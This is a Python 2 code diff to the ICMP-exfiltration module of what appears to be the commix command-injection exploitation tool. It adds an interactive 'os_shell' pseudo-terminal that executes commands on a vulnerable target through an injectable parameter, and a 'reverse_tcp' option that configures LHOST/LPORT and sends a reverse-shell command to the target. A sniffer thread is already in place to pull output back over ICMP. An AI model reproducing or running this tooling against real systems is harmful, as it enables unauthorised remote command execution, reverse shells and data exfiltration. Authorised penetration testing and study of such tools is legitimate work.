@@ -34,6 +34,9 @@ from src.core.requests import proxy
 from src.core.requests import headers
 from src.core.requests import parameters
 
+from src.core.shells import reverse_tcp
+from src.core.injections.controller import checks
+
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -84,33 +87,71 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   sys.stdout.write("\n" + Style.RESET_ALL)
 
 
-def input_cmd(http_request_method, url, vuln_parameter, ip_src):
-  print "\nPseudo-Terminal (type '?' for shell options)"
+def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
+  # Pseudo-Terminal shell
+  go_back = False
+  go_back_again = False
   while True:
-    try:
-      cmd = raw_input("Shell > ")
-      if cmd.lower() in settings.SHELL_OPTIONS:
-        if cmd.lower() == "?":
-          menu.shell_options()
-        elif cmd.lower() == "quit":
-          os._exit(0)
-        elif cmd.lower() == "back":
-          os._exit(0)
-        else:
-          pass
-      else:
-        cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
+    if go_back == True:
+      break
+    gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
+    if gotshell in settings.CHOISE_YES:
+      print "\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
+      while True:
+        try:
+          cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
+          cmd = checks.escaped_cmd(cmd)
+          if cmd.lower() in settings.SHELL_OPTIONS:
+            if cmd.lower() == "quit" or cmd.lower() == "back":       
+              print ""             
+              os._exit(0)
+            elif cmd.lower() == "?": 
+              menu.shell_options()
+            elif cmd.lower() == "os_shell": 
+              print Fore.YELLOW + "(^) Warning: You are already into the 'os_shell' mode." + Style.RESET_ALL + "\n"
+            elif cmd.lower() == "reverse_tcp":
+              # Set up LHOST / LPORT for The reverse TCP connection.
+              lhost, lport = reverse_tcp.configure_reverse_tcp()
+              while True:
+                if lhost and lport in settings.SHELL_OPTIONS:
+                  result = checks.check_reverse_tcp_options(lhost)
+                else:  
+                  cmd = reverse_tcp.reverse_tcp_options(lhost, lport)
+                  result = checks.check_reverse_tcp_options(cmd)
+                if result != None:
+                  if result == 0:
+                    return False
+                  elif result == 1 or result == 2:
+                    go_back_again = True
+                    break
+                cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src)
+                if menu.options.verbose:
+                  print ""
+                print Back.RED + "(x) Error: The reverse TCP connection to the target host has been failed!" + Style.RESET_ALL
 
-    except KeyboardInterrupt:
+        except KeyboardInterrupt:
+          print ""
+          os._exit(0)
+          
+        except:
+          print ""
+          os._exit(0)
+
+    elif gotshell in settings.CHOISE_NO:
       print ""
       os._exit(0)
-      
-    except:
+
+    elif gotshell in settings.CHOISE_QUIT:
       print ""
       os._exit(0)
 
+    else:
+      if gotshell == "":
+        gotshell = "enter"
+      print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
+      pass
 
-def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter):
+def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique):
   signal.signal(signal.SIGINT, signal_handler)
   sniffer_thread = threading.Thread(target=snif, args=(ip_dst, ip_src, )).start()
   time.sleep(2)
@@ -120,7 +161,7 @@ def exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter):
     print ""
     os._exit(0)
   else:
-    input_cmd(http_request_method, url, vuln_parameter, ip_src)
+    input_cmd(http_request_method, url, vuln_parameter, ip_src, technique)
 
 
 def icmp_exfiltration_handler(url, http_request_method):
@@ -178,7 +219,7 @@ def icmp_exfiltration_handler(url, http_request_method):
   ip_dst =  re.findall(r"ip_dst=(.*)", ip_data)
   ip_dst = ''.join(ip_dst)
   
-  exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter)
+  exploitation(ip_dst, ip_src, url, http_request_method, vuln_parameter, technique)
 
 if __name__ == "__main__":
   icmp_exfiltration_handler(url, http_request_method)
